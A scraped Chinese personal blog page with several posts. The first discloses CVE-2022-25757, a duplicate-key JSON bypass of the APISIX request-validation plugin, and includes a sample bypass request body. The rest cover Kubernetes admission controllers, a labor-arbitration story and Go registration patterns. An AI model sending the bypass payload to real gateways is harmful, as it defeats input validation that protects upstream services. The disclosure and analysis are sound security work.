<p>不过在这里确实发现了一个安全问题，报告给官方后，分配了<a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2022/03/28/2">CVE-2022-25757</a>。</p>
<p>下面来说一下这个安全问题。</p>
<h1 id="CVE-2022-25757"><a href="#CVE-2022-25757" class="headerlink" title="CVE-2022-25757"></a>CVE-2022-25757</h1><h2 id="这个安全问题是什么？"><a href="#这个安全问题是什么？" class="headerlink" title="这个安全问题是什么？"></a>这个安全问题是什么？</h2><p>request-validation插件可以检查HTTP请求头和BODY内容，当不符合用户配置的规则时，请求就不会转发到上游。</p>
<p>比如用户按照如下规则配置时，body_schema限制请求中必须要有string_payload参数，并且是字符串类型，长度在1到32字节之间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;routes&#x2F;10 -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;&#x2F;10&quot;,</span><br><span class="line">    &quot;plugins&quot;: &#123;</span><br><span class="line">        &quot;request-validation&quot;: &#123;</span><br><span class="line">        &quot;body_schema&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">              &quot;required&quot;: [&quot;string_payload&quot;],</span><br><span class="line">              &quot;properties&quot;: &#123;</span><br><span class="line">                  &quot;string_payload&quot;: &#123;</span><br><span class="line">                      &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                      &quot;minLength&quot;: 1,</span><br><span class="line">                      &quot;maxLength&quot;: 32</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;192.168.2.189:8888&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>但是恶意用户发送如下请求时，有可能绕过限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;10</span><br><span class="line">...</span><br><span class="line">&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="为什么会绕过限制？"><a href="#为什么会绕过限制？" class="headerlink" title="为什么会绕过限制？"></a>为什么会绕过限制？</h2><p>request-validation.lua中使用cjson.safe库解析字符串为json对象，对于带有”重复键值”的json，它会取最后面的值。比如<code>&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</code>，request-validation插件会认为string_payload=”1111”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">local _M &#x3D; &#123;</span><br><span class="line">    version &#x3D; 0.1,</span><br><span class="line">    decode &#x3D; require(&quot;cjson.safe&quot;).decode,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是有很多流行的库，对于带有”重复键值”的json，它会取最前面的值，因此<code>&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</code>会被认为string_payload=””。</p>
<p>因此request-validation插件和上游服务在解析json时可能存在差异性，所以会导致限制被绕过</p>
<h2 id="哪些库和request-validation插件在解析”重复键值json”时存在差异？"><a href="#哪些库和request-validation插件在解析”重复键值json”时存在差异？" class="headerlink" title="哪些库和request-validation插件在解析”重复键值json”时存在差异？"></a>哪些库和request-validation插件在解析”重复键值json”时存在差异？</h2><p>根据 <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/json-interoperability-vulnerabilities">https://bishopfox.com/blog/json-interoperability-vulnerabilities</a> 文章，可以知道最起码以下库和request-validation插件在解析”重复键值json”时存在差异。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/154656153-4b9c253b-e1af-47c3-9dfb-1fe40a922c3f.png" alt="img"></p>
<p>选取其中的gojay库做了验证，程序打印gojay而不是gojay2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import &quot;github.com&#x2F;francoispqt&#x2F;gojay&quot;</span><br><span class="line"></span><br><span class="line">type user struct &#123;</span><br><span class="line">    id int</span><br><span class="line">    name string</span><br><span class="line">    email string</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; implement gojay.UnmarshalerJSONObject</span><br><span class="line">func (u *user) UnmarshalJSONObject(dec *gojay.Decoder, key string) error &#123;</span><br><span class="line">    switch key &#123;</span><br><span class="line">    case &quot;id&quot;:</span><br><span class="line">        return dec.Int(&amp;u.id)</span><br><span class="line">    case &quot;name&quot;:</span><br><span class="line">        return dec.String(&amp;u.name)</span><br><span class="line">    case &quot;email&quot;:</span><br><span class="line">        return dec.String(&amp;u.email)</span><br><span class="line">    &#125;</span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br><span class="line">func (u *user) NKeys() int &#123;</span><br><span class="line">    return 3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    u :&#x3D; &amp;user&#123;&#125;</span><br><span class="line">    d :&#x3D; []byte(&#96;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;gojay&quot;,&quot;email&quot;:&quot;gojay@email.com&quot;&#125;,&quot;name&quot;:&quot;gojay2&quot;&#96;)</span><br><span class="line">    err :&#x3D; gojay.UnmarshalJSONObject(d, u)</span><br><span class="line">    if err !&#x3D; nil &#123;</span><br><span class="line">        &#x2F;&#x2F;log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    println(u.name);  &#x2F;&#x2F; 取最前面的key的值，也就是gojay，而不是gojay2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>评估思路比较简单：</p>
<ul>
<li>识别攻击面</li>
<li>api关注身份认证和鉴权</li>
<li>插件关注业务逻辑</li>
</ul>
<p>openresty配置中的api也是攻击面，下一篇再写。</p>
<blockquote>
<p>说一个题外话：apisix的插件机制提供了很好的扩展能力，再加上openresty的高性能，或许拿来做waf架构很合适。</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-06-13-%E5%87%86%E5%85%A5%E6%8E%A7%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-06-13-%E5%87%86%E5%85%A5%E6%8E%A7%E5%88%B6/" class="post-title-link" itemprop="url">浅识k8s准入控制</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-06-13 17:19:07 / 修改时间：22:58:47" itemprop="dateCreated datePublished" datetime="2022-06-13T17:19:07+08:00">2022-06-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JLsNAKHPOUPsFqq506WbPg">k8s中各组件和kube apiserver通信时的认证和鉴权</a> 中提到”NodeRestriction准入插件”，实际上它是一个”准入控制器”。</p>
<p>“准入控制器”是一个重要的概念，在istio、apisix、某些安全产品中都有用到。</p>
<p>本文简要记录一下以下内容：</p>
<ul>
<li>“准入控制器”是什么</li>
<li>怎么开启”准入控制器”</li>
<li>从源码浅析”准入控制器”</li>
</ul>
<blockquote>
<p>本文使用的k8s集群是用<a target="_blank" rel="noopener" href="https://github.com/kubesphere/kubekey/blob/master/README_zh-CN.md">kubekey</a>搭建，命令是./kk create cluster –with-kubernetes v1.21.5 –with-kubesphere v3.2.1</p>
</blockquote>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="“准入控制器”是什么？"><a href="#“准入控制器”是什么？" class="headerlink" title="“准入控制器”是什么？"></a>“准入控制器”是什么？</h2><p>它有点类似”插件”，为apiserver提供了很好的”可扩展性”。</p>
<p>请求apiserver时，通过认证、鉴权后、持久化(“api对象”保存到etcd)前，会经过”准入控制器”，让它可以做”变更和验证”。</p>
<p>“变更”可以修改”api对象”，比如istio用来实现pod注入。”验证”可以用来校验”api对象”，比如 校验当前集群是否有足够多的资源满足”api对象”、校验当前提交的”pod对象”是否合法。</p>
<h2 id="怎么开启”准入控制器”？"><a href="#怎么开启”准入控制器”？" class="headerlink" title="怎么开启”准入控制器”？"></a>怎么开启”准入控制器”？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-14-33:~&#x2F;kubernetes-1.21.5&#x2F;_output&#x2F;bin# .&#x2F;kube-apiserver --help |grep admission-plugins</span><br><span class="line">    ...</span><br><span class="line">    --enable-admission-plugins strings       admission plugins that should be enabled in addition to default enabled ones (NamespaceLifecycle, LimitRanger, ServiceAccount, TaintNodesByCondition, Priority, DefaultTolerationSeconds, DefaultStorageClass, StorageObjectInUseProtection, PersistentVolumeClaimResize, RuntimeClass, CertificateApproval, CertificateSigning, CertificateSubjectRestriction, DefaultIngressClass, MutatingAdmissionWebhook, ValidatingAdmissionWebhook, ResourceQuota). Comma-delimited list of admission plugins: AlwaysAdmit, AlwaysDeny, AlwaysPullImages, CertificateApproval, CertificateSigning, CertificateSubjectRestriction, DefaultIngressClass, DefaultStorageClass, DefaultTolerationSeconds, DenyServiceExternalIPs, EventRateLimit, ExtendedResourceToleration, ImagePolicyWebhook, LimitPodHardAntiAffinityTopology, LimitRanger, MutatingAdmissionWebhook, NamespaceAutoProvision, NamespaceExists, NamespaceLifecycle, NodeRestriction, OwnerReferencesPermissionEnforcement, PersistentVolumeClaimResize, PersistentVolumeLabel, PodNodeSelector, PodSecurityPolicy, PodTolerationRestriction, Priority, ResourceQuota, RuntimeClass, SecurityContextDeny, ServiceAccount, StorageObjectInUseProtection, TaintNodesByCondition, ValidatingAdmissionWebhook. The order of plugins in this flag does not matter.</span><br></pre></td></tr></table></figure>

<p>根据命令行帮助可以知道，默认会开启17个”准入控制器”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a&#x3D;&quot;NamespaceLifecycle, LimitRanger, ServiceAccount, TaintNodesByCondition, Priority, DefaultTolerationSeconds, DefaultStorageClass, StorageObjectInUseProtection, Persis</span><br><span class="line">tentVolumeClaimResize, RuntimeClass, CertificateApproval, CertificateSigning, CertificateSubjectRestriction, DefaultIngressClass, MutatingAdmissionWebhook, ValidatingAdmissionWebhook, ResourceQuota&quot;</span><br><span class="line">&gt;&gt;&gt; len(a.split(&quot;,&quot;))</span><br><span class="line">17</span><br></pre></td></tr></table></figure>

<p>也可以用–enable-admission-plugins开启额外的”准入控制器”。</p>
<p>这些”准入控制器”介绍可以查看 <a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/admission-controllers/">使用准入控制器</a> 文档。在我的实验环境中，可以看到额外开启了<code>NodeRestriction准入控制器</code>，它实现了apiserver对kubelet请求的权限控制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-14-33:~# ps aux|grep kube-apis</span><br><span class="line">root      9567  4.8  7.8 1381988 613048 ?      Ssl  03:49  17:48 kube-apiserver ... --enable-admission-plugins&#x3D;NodeRestriction ...</span><br></pre></td></tr></table></figure>

<h2 id="从源码浅析”准入控制器”"><a href="#从源码浅析”准入控制器”" class="headerlink" title="从源码浅析”准入控制器”"></a>从源码浅析”准入控制器”</h2><p>我们可以通过”断点调试”结合源码分析，验证前面说的两个结论：</p>
<ul>
<li>请求先经过认证、鉴权，然后经过”准入控制器”</li>
<li>默认开启17个”准入控制器”；加上NodeRestriction就是18个</li>
</ul>
<p>“认证、日志审计、鉴权”在apiserver中都是以filter的形式存在，而”准入控制器”有点像包装了一层servlet。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func DefaultBuildHandlerChain(apiHandler http.Handler, c *Config) http.Handler &#123;</span><br><span class="line">	handler :&#x3D; filterlatency.TrackCompleted(apiHandler)</span><br><span class="line">	handler &#x3D; genericapifilters.WithAuthorization(handler, c.Authorization.Authorizer, c.Serializer) &#x2F;&#x2F; 鉴权</span><br><span class="line">	...</span><br><span class="line">	handler &#x3D; genericapifilters.WithAudit(handler, c.AuditBackend, c.AuditPolicyChecker, c.LongRunningFunc)  &#x2F;&#x2F; 日志审计</span><br><span class="line">	...</span><br><span class="line">  handler &#x3D; genericapifilters.WithAuthentication(handler, c.Authentication.Authenticator, failedHandler, c.Authentication.APIAudiences) &#x2F;&#x2F; 认证</span><br><span class="line">	...</span><br><span class="line">	return handler</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>finishRequest函数中会开goroutine调用”准入控制器”<br><img src="https://user-images.githubusercontent.com/1846319/172763360-893e4afd-b937-410f-acbf-f225c1ffd82d.png" alt="img"></p>
<p>可以看到 admissionHandler切片长度是18，17个”默认开启的准入控制器”加上NodeRestriction<br><img src="https://user-images.githubusercontent.com/1846319/172758085-52f6bde8-6d68-43c8-9f11-32408207b966.png" alt="img"></p>
<p>部分控制器代码在plugin/pkg/admission目录中，会实现Admit接口<br><img src="https://user-images.githubusercontent.com/1846319/173340117-3b177dd1-60d5-466c-b82e-f4c09a4962d3.png" alt="img"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>请求先经过认证、鉴权，然后经过”准入控制器”</li>
<li>默认开启17个”准入控制器”；NodeRestriction不是默认开启的</li>
</ul>
<p>默认开启的”准入控制器”中有两个很特殊的，ValidatingAdmissionWebhook和MutatingAdmissionWebhook。这两个控制器让apiserver有了更多的可扩展性，实现了”动态准入控制”。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-05-01-%E4%B8%80%E6%AC%A1%E4%BB%B2%E8%A3%81%E7%BB%8F%E5%8E%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-05-01-%E4%B8%80%E6%AC%A1%E4%BB%B2%E8%A3%81%E7%BB%8F%E5%8E%86/" class="post-title-link" itemprop="url">一次仲裁经历</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-01 11:43:41" itemprop="dateCreated datePublished" datetime="2022-05-01T11:43:41+08:00">2022-05-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-06-13 23:10:27" itemprop="dateModified" datetime="2022-06-13T23:10:27+08:00">2022-06-13</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <!-- * 谁
  * 公司：hr
  * 我、同事
  * 仲裁院
  * 律师：同学、仲裁员律师

文章主旨：给遇到裁员的人一个经验、劳动合同中的坑。给胡千做宣传 -->

<p>2022年4月8号，在海淀区劳动人事争议仲裁院，我这一趟”感受劳动法保护之旅”终于完结，在仲裁庭和上家公司达成和解。</p>
<p>我为什么想要仲裁呢？一个原因是公司给的赔偿方案是N+1，而我是想要2N+年终奖，另一个原因是我想感受下”劳动法对咱劳动者的保护”，刚好我也不太着急找工作，所以有时间仲裁。</p>
<p>在决定仲裁后，我被拉进了一个仲裁微信群，群里有接近20个人。群里有些同事可能有些经验，会在群里说”保存绩效截图证据”这种注意事项。不幸的是，没两天群就解散了。私信问了一个群里活跃的同事，她说因为绩效在被裁前还没出来，所以他们好几个人就不仲裁了、拿了N+1。于是我就一个人去仲裁。</p>
<p>仲裁时间周期比较长，从12.27号到4.8号仲裁开庭，总共去了五次，分别是递交申请材料、调解、拿举证通知、递交和交换举证材料、仲裁开庭。</p>
<p>仲裁过程比较简单，没有花一毛钱，我也没有请律师。仲裁厅是有律师可以咨询的，排队取号就行也不用花钱，不过服务态度一般。</p>
<p>仲裁厅的人特别热情，我在写第一次申请材料时不知道怎么写清楚”诉求中的事实和理由”，就用手机搜索，被巡视的工作人员瞟到后，过来给我说，”别网上瞎搜了，来，我告诉你这个怎么填”，然后就呱唧给我说一通。我当时心里想着”仲裁厅可真不错啊”，感觉来对地方了。</p>
<p>但是到了仲裁开庭时，就没有这么好的感受了。调解员把公司hr支出去后，单独和我谈话：如果我和公司达不成和解，后面就要去法院，这样结果得等到明年去了；即使上了法院，也不一定就能拿到年终奖；不要想着完全按劳动法来。</p>
<p>我感觉年终奖可能确实难拿。上家公司关于年终奖的说明是写在录用函里而不是劳动合同里，并且写的是”年终奖是浮动的，公司有最终解释权”，同时hr说他们自己都没有年终奖、在职的部门同事也说没有年终奖。看了下我现在公司的劳动合同，把年终奖是写到合同里了，没有”浮动，绩效”这些字眼，挺好。</p>
<p>再来说说N+1、2N中税的问题。N+1中的N叫做离职补偿金，有一个免税额度，因为上限是本市年度平均工资的三倍，比较高，所以可以认为N是不交税的。N+1中的1叫做代通知金，是要交税的。2N其中一个N是要交税的。</p>
<p>前几天看到一个知乎热帖下的回答 <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/530759555/answer/2464814635?utm_source=wechat_session&utm_medium=social&utm_oi=27700794228736&utm_content=group2_Answer&utm_campaign=shareopn">女子拒调岗「高管」变「客服」被开除，公司被判赔 59 万，如何从法律角度解读？</a> ，感觉相对于仲裁来说，诉讼真是花时间啊。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-04-23-%E9%9D%A2%E5%90%91%E6%8E%A5%E5%8F%A3%E7%BC%96%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-04-23-%E9%9D%A2%E5%90%91%E6%8E%A5%E5%8F%A3%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">面向接口编程的三个例子</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-04-23 22:04:52" itemprop="dateCreated datePublished" datetime="2022-04-23T22:04:52+08:00">2022-04-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-06-13 22:59:19" itemprop="dateModified" datetime="2022-06-13T22:59:19+08:00">2022-06-13</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在用go操作mysql数据库时会经常见到类似下面的代码，空导入”go-sql-driver/mysql”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">	&quot;database&#x2F;sql&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line"></span><br><span class="line">	_ &quot;github.com&#x2F;go-sql-driver&#x2F;mysql&quot;   &#x2F;&#x2F; 空导入</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">db, err :&#x3D; sql.Open(&quot;mysql&quot;, &quot;user:password@&#x2F;dbname&quot;)</span><br></pre></td></tr></table></figure>

<p>我之前对上面代码有点疑问：空导入有什么意义吗？</p>
<p>后面知道go在导入包时，会执行包中的init函数，所以上面的空导入会执行 <a target="_blank" rel="noopener" href="https://github.com/go-sql-driver/mysql/blob/v1.6.0/driver.go">github.com/go-sql-driver/mysql/driver.go</a> 中的init函数来注册驱动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">	sql.Register(&quot;mysql&quot;, &amp;MySQLDriver&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再后来，见到好多次类似”注册模式”的写法，逐渐能从中体会到”面向接口编程”的思想。然后就多了一个好处：在做代码审计时，因为了解这种”业务套路”，所以更容易理解代码逻辑；</p>
<p>下面分享三个用到这种模式的例子，分别是go sql库、go swagger库、python flask库</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul>
<li><p>这种”注册模式”是什么？</p>
<p>包含有三个角色：</p>
<ul>
<li>接口层：定义接口、提供”注册实例接口”、提供”获取服务”或者”功能接口”</li>
<li>服务提供者：实现接口、注册”接口实现”</li>
<li>服务使用者：调用”获取服务接口”</li>
</ul>
<p>这个结论是我根据三个例子总结出来的，下面来具体看看三个角色的功能</p>
</li>
</ul>
<h1 id="go-sql"><a href="#go-sql" class="headerlink" title="go sql"></a>go sql</h1><ul>
<li><p>是什么？</p>
<p>  见 <a target="_blank" rel="noopener" href="https://github.com/go-sql-driver/mysql">https://github.com/go-sql-driver/mysql</a> 文档中的例子，用户可以使用驱动名获取到”包含驱动实例的对象”</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db, err :&#x3D; sql.Open(&quot;mysql&quot;, &quot;user:password@&#x2F;dbname&quot;) &#x2F;&#x2F; db中包含驱动实现</span><br></pre></td></tr></table></figure>

<p>这里”用户”就是”服务使用者”。</p>
<p>“接口层”是”database/sql”库，它在 <a target="_blank" rel="noopener" href="https://github.com/golang/go/blob/go1.17.9/src/database/sql/driver/driver.go">database/sql/driver/driver.go</a> 文件中定义了接口，”驱动”需要实现下面的Open方法</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type Driver interface &#123;</span><br><span class="line">	...</span><br><span class="line">	Open(name string) (Conn, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  <a target="_blank" rel="noopener" href="https://github.com/golang/go/blob/go1.17.9/src/database/sql/sql.go">database/sql/sql.go</a>中提供”注册实例接口”，”驱动”可以调用Register函数注册。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func Register(name string, driver driver.Driver) &#123;</span><br><span class="line">	driversMu.Lock()</span><br><span class="line">	defer driversMu.Unlock()</span><br><span class="line">	if driver &#x3D;&#x3D; nil &#123;</span><br><span class="line">		panic(&quot;sql: Register driver is nil&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	if _, dup :&#x3D; drivers[name]; dup &#123;</span><br><span class="line">		panic(&quot;sql: Register called twice for driver &quot; + name)</span><br><span class="line">	&#125;</span><br><span class="line">	drivers[name] &#x3D; driver</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  <a target="_blank" rel="noopener" href="https://github.com/golang/go/blob/go1.17.9/src/database/sql/sql.go">database/sql/sql.go</a>中提供”获取服务接口”，”用户”可以调用Open函数获取DB实例</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">func Open(driverName, dataSourceName string) (*DB, error) &#123;</span><br><span class="line">	driversMu.RLock()</span><br><span class="line">	driveri, ok :&#x3D; drivers[driverName]</span><br><span class="line">	driversMu.RUnlock()</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	return OpenDB(dsnConnector&#123;dsn: dataSourceName, driver: driveri&#125;), nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  “服务提供者”就是”驱动”，这里就是 <a target="_blank" rel="noopener" href="https://github.com/go-sql-driver/mysql/blob/v1.6.0/driver.go">github.com/go-sql-driver/mysql</a></p>
<p>  它实现了Driver接口</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">type MySQLDriver struct&#123;&#125;</span><br><span class="line">...</span><br><span class="line">func (d MySQLDriver) Open(dsn string) (driver.Conn, error) &#123;</span><br><span class="line">	cfg, err :&#x3D; ParseDSN(dsn)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	c :&#x3D; &amp;connector&#123;</span><br><span class="line">		cfg: cfg,</span><br><span class="line">	&#125;</span><br><span class="line">	return c.Connect(context.Background())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  并且调用Register方法注册”接口实现”，代码见<a target="_blank" rel="noopener" href="https://github.com/go-sql-driver/mysql/blob/v1.6.0/driver.go">github.com/go-sql-driver/mysql/driver.go</a></p>
